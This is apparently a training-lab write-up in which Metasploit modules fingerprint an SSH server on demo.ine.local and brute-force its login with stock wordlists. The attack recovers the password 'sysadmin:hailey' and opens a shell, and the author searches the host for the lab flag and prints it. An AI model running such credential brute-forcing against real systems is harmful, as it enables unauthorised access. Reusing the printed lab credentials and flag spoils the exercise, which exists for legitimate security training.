# SSH login

### Target:
`demo.ine.local`

### Objectives:
Test the following modules:
* auxiliary/scanner/ssh/ssh_version
* auxiliary/scanner/ssh/ssh_login

---
We first try to find the ssh version via **ssh_version** module.  
```bash
msf6 auxiliary(scanner/ssh/ssh_version) > setg RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/ssh/ssh_version) > run

[*] 192.91.133.3 - Key Fingerprint: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDQNOa6QL7Ut9y1RWimBpHbuhZdjMn2nPLc96oZZh8u2
[*] 192.91.133.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
[*] 192.91.133.3 - Server Information and Encryption
=================================

  Type                     Value                                 Note
  ----                     -----                                 ----
  encryption.compression   none
  encryption.compression   zlib@openssh.com
  encryption.encryption    chacha20-poly1305@openssh.com
  encryption.encryption    aes128-ctr
  encryption.encryption    aes192-ctr
  encryption.encryption    aes256-ctr
  encryption.encryption    aes128-gcm@openssh.com
  encryption.encryption    aes256-gcm@openssh.com
  encryption.hmac          umac-64-etm@openssh.com
  encryption.hmac          umac-128-etm@openssh.com
  encryption.hmac          hmac-sha2-256-etm@openssh.com
  encryption.hmac          hmac-sha2-512-etm@openssh.com
  encryption.hmac          hmac-sha1-etm@openssh.com
  encryption.hmac          umac-64@openssh.com
  encryption.hmac          umac-128@openssh.com
  encryption.hmac          hmac-sha2-256
  encryption.hmac          hmac-sha2-512
  encryption.hmac          hmac-sha1
  encryption.host_key      rsa-sha2-512
  encryption.host_key      rsa-sha2-256
  encryption.host_key      ssh-rsa
  encryption.host_key      ecdsa-sha2-nistp256                   Weak elliptic curve
  encryption.host_key      ssh-ed25519
  encryption.key_exchange  curve25519-sha256
  encryption.key_exchange  curve25519-sha256@libssh.org
  encryption.key_exchange  ecdh-sha2-nistp256
  encryption.key_exchange  ecdh-sha2-nistp384
  encryption.key_exchange  ecdh-sha2-nistp521
  encryption.key_exchange  diffie-hellman-group-exchange-sha256
  encryption.key_exchange  diffie-hellman-group16-sha512
  encryption.key_exchange  diffie-hellman-group18-sha512
  encryption.key_exchange  diffie-hellman-group14-sha256
  encryption.key_exchange  diffie-hellman-group14-sha1
  fingerprint_db           ssh.banner
  openssh.comment          Ubuntu-10
  os.cpe23                 cpe:/o:canonical:ubuntu_linux:19.04
  os.family                Linux
  os.product               Linux
  os.vendor                Ubuntu
  os.version               19.04
  service.cpe23            cpe:/a:openbsd:openssh:7.9p1
  service.family           OpenSSH
  service.product          OpenSSH
  service.protocol         ssh
  service.vendor           OpenBSD
  service.version          7.9p1

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_version) > 
```
Now we try to bruteforce the username and password for the ssh session. We use the recommended wordlists and set it to stop once done and let it run.
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true 
stop_on_success => true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.91.133.3:22 - Starting bruteforce
[+] 192.91.133.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-36-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun 10 10:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 2 opened (192.91.133.2:35973 -> 192.91.133.3:22) at 2025-08-10 21:37:38 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > 
```
The above module automatically starts a session. So we just log into the existing session and then search for the flag.  
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  2         shell linux  SSH root @   192.91.133.2:35973 -> 192.91.133.3:22 (192.91.133.3)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[-] Invalid session identifier: 1
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
[*] Starting interaction with 2...

whoami
sysadmin
ls
find falg
find: 'falg': No such file or directory
find flag
find: 'flag': No such file or directory
find / -name flag
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/private': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/private': Permission denied
find: '/var/log/private': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/proc/1/task/1/fd': Permission denied
find: '/proc/1/task/1/fdinfo': Permission denied
find: '/proc/1/task/1/ns': Permission denied
find: '/proc/1/fd': Permission denied
find: '/proc/1/map_files': Permission denied
find: '/proc/1/fdinfo': Permission denied
find: '/proc/1/ns': Permission denied
find: '/proc/7/task/7/fd': Permission denied
find: '/proc/7/task/7/fdinfo': Permission denied
find: '/proc/7/task/7/ns': Permission denied
find: '/proc/7/fd': Permission denied
find: '/proc/7/map_files': Permission denied
find: '/proc/7/fdinfo': Permission denied
find: '/proc/7/ns': Permission denied
find: '/proc/16/task/16/fd': Permission denied
find: '/proc/16/task/16/fdinfo': Permission denied
find: '/proc/16/task/16/ns': Permission denied
find: '/proc/16/fd': Permission denied
find: '/proc/16/map_files': Permission denied
find: '/proc/16/fdinfo': Permission denied
find: '/proc/16/ns': Permission denied
find: '/proc/17/task/17/fd': Permission denied
find: '/proc/17/task/17/fdinfo': Permission denied
find: '/proc/17/task/17/ns': Permission denied
find: '/proc/17/fd': Permission denied
find: '/proc/17/map_files': Permission denied
find: '/proc/17/fdinfo': Permission denied
find: '/proc/17/ns': Permission denied
find: '/proc/64/task/64/fd': Permission denied
find: '/proc/64/task/64/fdinfo': Permission denied
find: '/proc/64/task/64/ns': Permission denied
find: '/proc/64/fd': Permission denied
find: '/proc/64/map_files': Permission denied
find: '/proc/64/fdinfo': Permission denied
find: '/proc/64/ns': Permission denied
find: '/proc/75/task/75/fd': Permission denied
find: '/proc/75/task/75/fdinfo': Permission denied
find: '/proc/75/task/75/ns': Permission denied
find: '/proc/75/fd': Permission denied
find: '/proc/75/map_files': Permission denied
find: '/proc/75/fdinfo': Permission denied
find: '/proc/75/ns': Permission denied
find: '/proc/163/task/163/fd': Permission denied
find: '/proc/163/task/163/fdinfo': Permission denied
find: '/proc/163/task/163/ns': Permission denied
find: '/proc/163/fd': Permission denied
find: '/proc/163/map_files': Permission denied
find: '/proc/163/fdinfo': Permission denied
find: '/proc/163/ns': Permission denied
find: '/proc/178/task/178/fd': Permission denied
find: '/proc/178/task/178/fdinfo': Permission denied
find: '/proc/178/task/178/ns': Permission denied
find: '/proc/178/fd': Permission denied
find: '/proc/178/map_files': Permission denied
find: '/proc/178/fdinfo': Permission denied
find: '/proc/178/ns': Permission denied
find: '/root': Permission denied
find: '/etc/ssl/private': Permission denied
/flag
cat /flag
eb09cc6f1cd72756da145892892fbf5a
```
Flag: **eb09cc6f1cd72756da145892892fbf5a**